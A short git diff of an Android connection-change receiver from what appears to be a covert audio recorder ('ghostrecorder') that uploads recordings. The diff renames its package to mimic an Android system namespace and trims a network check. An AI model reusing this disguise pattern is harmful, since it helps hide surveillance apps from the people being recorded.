@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -9,6 +9,7 @@ import android.util.Log;
 import java.util.ArrayList;
 
 public class ConnectionChangeReceiver extends BroadcastReceiver {
+
     private UploadRecordingTaskHelpers mUploadHelpers;
     private UploadRecordingTask uploadRecordingTask;
     private Context mContext;
@@ -27,12 +28,8 @@ public class ConnectionChangeReceiver extends BroadcastReceiver {
         recordingDatabaseHelper = new RecordingDatabaseHelper(mContext);
         mUploadHelpers = new UploadRecordingTaskHelpers(mContext);
         if (mUploadHelpers.isNetworkAvailable()) {
-            new Thread(mUploadHelpers).start();
-            int network = mUploadHelpers.networkAvailable();
-            if (network == 0) {
                 Log.i(LOG_TAG, "Ping success");
                 deletePreviousUploadFailFileOnServer();
-            }
         }
     }
 
